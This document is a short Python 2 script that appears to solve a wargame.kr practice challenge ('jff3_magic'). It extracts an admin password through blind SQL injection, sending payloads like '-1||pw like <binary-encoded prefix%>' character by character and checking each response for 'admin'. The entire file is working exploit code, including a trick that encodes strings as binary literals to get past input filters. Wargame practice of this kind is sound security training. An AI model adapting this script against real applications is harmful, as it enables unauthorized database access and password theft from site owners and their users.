'''
Created on 2016-3-27

@author: wenhuizone
'''
import time
import urllib
import urllib2
import re
import binascii

url = "http://wargame.kr:8080/jff3_magic/?no="
str_list = "abcdefghijklmnopqrstuvwxyz0123456789"
pw = ""

def send_payload(payload):
    global url 
    
    opener = urllib2.build_opener(urllib2.HTTPHandler)
    request = urllib2.Request(url + urllib.quote(payload))
    #req.add_header("Cookie", "") #
    #request.get_method = lambda:'POST'
    data = opener.open(request)
    return data.read()

for i in range(32):
    for ch in str_list:
        payload = "-1||pw like "+str(bin(int(binascii.hexlify(pw + ch + "%"),16)))

        if "admin" in send_payload(payload):
            print "[+] True"
            pw += ch
            break;
        else:
            print "[-] False"
            
print pw